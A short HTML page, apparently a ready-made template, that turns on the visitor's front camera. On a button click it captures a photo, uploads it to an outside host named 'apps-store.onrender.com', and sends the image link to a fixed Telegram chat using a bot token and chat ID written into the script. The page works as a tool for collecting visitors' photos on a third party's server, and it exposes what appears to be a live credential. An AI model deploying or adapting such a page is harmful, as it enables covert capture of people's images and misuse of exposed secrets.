<!DOCTYPE html>
<html>
<head>
    <title>Kamera Depan dan Kirim ke Telegram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        #cameraContainer {
            text-align: center;
        }
        #video {
            width: 640px;
            height: 480px;
            background-color: #f0f0f0;
            border: 2px solid #333;
            border-radius: 5px;
        }
        #captureButton {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 18px;
            cursor: pointer;
            background-color: #3498db;
            color: white;
            border: none;
            border-radius: 5px;
        }
        #captureButton:hover {
            background-color: #2980b9;
        }
    </style>
</head>
<body>
    <div id="cameraContainer">
        <video id="video" autoplay></video>
        <button id="captureButton">Kirim Gambar ke Telegram</button>
    </div>
    <script>
        const video = document.getElementById('video');
        const captureButton = document.getElementById('captureButton');

        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(error => {
                console.error('Terjadi kesalahan:', error);
            });

        captureButton.addEventListener('click', () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('image', blob, 'capture.png');

                fetch('https://apps-store.onrender.com/', {
                    method: 'POST',
                    body: formData
                })
                    .then(response => response.json())
                    .then(data => {
                        const botToken = '8359132305:AAFGAdP03knmnPkauPBoAcE9gCjVMmv3jMc';
                        const chatId = '1966317946';
                        const message = 'Gambar dari kamera depan: ' + data.imageUrl;

                        fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: message
                            })
                        })
                            .then(response => response.json())
                            .then(data => {
                                console.log('Gambar berhasil dikirim ke Telegram:', data);
                            })
                            .catch(error => {
                                console.error('Terjadi kesalahan:', error);
                            });
                    })
                    .catch(error => {
                        console.error('Terjadi kesalahan:', error);
                    });
            });
        });
    </script>
</body>
</html>
